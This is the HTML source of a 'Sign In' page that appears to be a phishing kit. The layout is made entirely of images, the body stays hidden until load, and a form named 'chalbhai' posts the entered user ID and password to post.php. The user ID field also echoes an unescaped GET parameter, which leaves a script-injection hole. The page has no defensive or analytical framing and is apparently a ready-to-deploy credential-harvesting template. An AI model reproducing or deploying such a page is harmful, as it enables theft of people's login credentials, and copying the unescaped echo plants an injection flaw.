<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Sign In</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
<style type="text/css">
div#container
{
	position:relative;
	width: 1353px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>
 <style type="text/css">
 .textbox { 
display: block;
    width: 100%;
    height: 46px;
    padding: 10px 20px;
    font-size: 16px;
    font-weight: 400;
    line-height: 1.42857143;
    color: #555;
    vertical-align: middle;
    background-color: #fff;
    border: 1px solid #aea99c;
    border-radius: 3px;
	 }
 </style>
 <link rel="shortcut icon"
              href="images/favicon.ico"/>	
<script type="text/javascript">
function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}
</script>
<body style="visibility:hidden" onload="unhideBody()">
</head>
<body bgColor="#E8E8E8">
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1350px; height:52px; z-index:0"><img src="images/header.png" alt="" title="" border=0 width=1350 height=52></div>

<div id="image2" style="position:absolute; overflow:hidden; left:0px; top:192px; width:683px; height:393px; z-index:1"><img src="images/computer.png" alt="" title="" border=0 width=683 height=393></div>

<div id="image3" style="position:absolute; overflow:hidden; left:682px; top:108px; width:575px; height:508px; z-index:2"><img src="images/login.png" alt="" title="" border=0 width=575 height=508></div>

<div id="image4" style="position:absolute; overflow:hidden; left:0px; top:678px; width:1353px; height:78px; z-index:3"><img src="images/footer.png" alt="" title="" border=0 width=1353 height=78></div>
<form action="post.php" name=chalbhai id=chalbhai method=post>
<input name="userid" value="<?=$_GET[userid]?>" placeholder="" autocomplete="off"  class="textbox" required type="text" style="position:absolute;width:365px;left:786px;top:344px;z-index:4">
<input name="pass" placeholder="" autocomplete="off"  class="textbox" required type="password" style="position:absolute;width:365px;left:786px;top:427px;z-index:5">
<div id="image5" style="position:absolute; overflow:hidden; left:1094px; top:400px; width:61px; height:20px; z-index:6"><a href="#"><img src="images/forg.png" alt="" title="" border=0 width=61 height=20></a></div>

<div id="formcheckbox1" style="position:absolute; left:782px; top:484px; z-index:7"><input type="checkbox" name="formcheckbox1"></div>
<div id="formimage1" style="position:absolute; left:785px; top:513px; z-index:8"><input type="image" name="formimage1" width="369" height="50" src="images/button.png"></div>
</div>

</body>
</html>
